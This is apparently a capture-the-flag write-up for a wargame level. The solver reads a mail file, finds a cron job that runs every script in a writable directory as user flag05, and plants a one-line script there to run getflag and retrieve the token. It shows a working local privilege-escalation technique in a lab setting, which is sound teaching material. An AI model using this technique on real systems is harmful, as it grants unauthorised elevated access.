# Level 05

## Initial Context

- Empty home directory.
- `You have new mail.`

## Solving the Challenge

When we log as `level05`, a message saying `You have new mail.` is displayed.

And it seems that we do:

```bash
$ ls -l /var/mail/
total 4
-rw-r--r--+ 1 root mail 58 Apr 20 21:31 level05
```

The file content is:

```bash
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

It is a CRON that execute `/usr/sbin/openarenaserver` as `flag05` every 2 minutes.

```
 .--------------------- every 2 minutes
 |  .------------------ every hours
 |  | .---------------- every days
 |  | | .-------------- every month
 |  | | | .------------ every weekday
 |  | | | |    .------- execute a command
 |  | | | |    |        execute it as flag05 --------.
 |  | | | |    |                                     |
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This file contains:

```bash
$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

It will loop over all file inside the `/opt/openarenaserver/*` and remove then after executing them.

So by putting a custom script into it, it should be executed.

```bash
$ echo 'getflag > /tmp/level05_flag' > /opt/openarenaserver/getflag.sh
$ sleep 2m
$ cat /tmp/level05_flag
Check flag.Here is your token : ....
```

Success!